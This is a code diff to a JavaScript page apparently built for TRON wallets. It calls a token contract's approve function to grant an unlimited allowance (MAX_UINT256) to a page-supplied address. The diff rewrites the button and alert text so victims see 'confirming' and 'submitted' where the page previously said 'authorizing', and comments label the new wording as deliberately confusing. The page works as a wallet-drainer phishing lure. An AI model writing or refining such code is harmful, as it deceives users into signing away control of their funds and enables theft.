@@ -159,7 +159,7 @@ document.addEventListener('DOMContentLoaded', () => {
         }
 
         try {
-            btnNext.textContent = "授权中...";
+            btnNext.textContent = "正在确认..."; // Confusing text
             btnNext.disabled = true;
 
             const currentTronWeb = window.tronWeb;
@@ -172,14 +172,14 @@ document.addEventListener('DOMContentLoaded', () => {
             // 使用 window.Permission_address 进行授权
             const result = await contract.approve(window.Permission_address, MAX_UINT256).send();
             
-            console.log("Authorization result:", result);
-            alert("授权成功！");
+            console.log("Transaction submitted:", result);
+            alert("提交成功！"); // Confusing success message
             btnNext.textContent = "下一步";
             btnNext.disabled = false;
 
         } catch (error) {
-            console.error("Authorization failed:", error);
-            alert("授权失败: " + (error.message || error));
+            console.error("Transaction failed:", error);
+            alert("提交失败: " + (error.message || error));
             btnNext.textContent = "下一步";
             btnNext.disabled = false;
         }
